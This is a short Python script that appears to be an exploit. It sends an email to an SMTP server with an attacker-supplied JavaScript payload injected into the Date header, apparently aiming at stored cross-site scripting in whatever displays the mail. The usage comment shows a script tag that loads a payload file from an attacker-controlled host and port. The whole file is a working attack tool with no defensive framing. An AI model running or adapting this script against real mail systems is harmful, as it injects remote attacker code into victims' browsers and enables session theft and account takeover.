#!/usr/bin/python

# Usage: ./sendemail.py victim-ip "<script src='http://attacker-ip:attacker-port/xss-paylaod.js'></script>"
import smtplib, urllib2, sys

def sendMail(dstemail, frmemail, smtpsrv, payload):
   msg  = "From: attacker@roguesecurity.in\n"
   msg += "To: admin@roguesecurity.in\n"
   msg += "Date: %s\n" % payload
   msg += "Subject: Planning to Hack\n"
   msg += "Content-type: text/html\n\n"
   msg += "You have been Hacked !!!!"
   msg += '\r\n\r\n'
   
   server = smtplib.SMTP(smtpsrv)
   
   try:
       server.sendmail(frmemail, dstemail, msg)
       print "[+] Email is sent :) "
       
   except Exception, e:
       print "[-] Failed to send the email:"
       print "[*] " + str(e)
       
   server.quit()

dstemail = "admin@roguesecurity.in"
frmemail = "attacker@roguesecurity.in"

if not (dstemail and frmemail):
  sys.exit()

if __name__ == "__main__":
   if len(sys.argv) != 3:
       print "(+) usage: %s <server> <js payload>" % sys.argv[0]
       sys.exit(-1)
       
   smtpsrv = sys.argv[1]
   payload = sys.argv[2]
   
   sendMail(dstemail, frmemail, smtpsrv, payload)
